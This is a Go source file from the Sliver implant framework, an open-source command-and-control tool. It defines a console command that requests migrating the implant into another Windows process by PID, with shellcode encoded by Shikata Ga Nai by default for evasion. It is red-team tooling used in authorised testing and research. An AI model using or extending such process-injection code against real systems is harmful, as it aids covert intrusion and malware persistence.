package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/desertbit/grumble"
)

// MigrateCmd - Windows only, inject an implant into another process
func MigrateCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSession()
	if session == nil {
		return
	}

	pid := ctx.Args.Uint("pid")
	config := con.GetActiveSessionConfig()
	encoder := clientpb.ShellcodeEncoder_SHIKATA_GA_NAI
	if ctx.Flags.Bool("disable-sgn") {
		encoder = clientpb.ShellcodeEncoder_NONE
	}

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Migrating into %d ...", pid), ctrl)

	migrate, err := con.Rpc.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:     uint32(pid),
		Config:  config,
		Request: con.ActiveTarget.Request(ctx),
		Encoder: encoder,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}
	if !migrate.Success {
		con.PrintErrorf("%s\n", migrate.GetResponse().GetErr())
		return
	}
	con.PrintInfof("Successfully migrated to %d\n", pid)
}
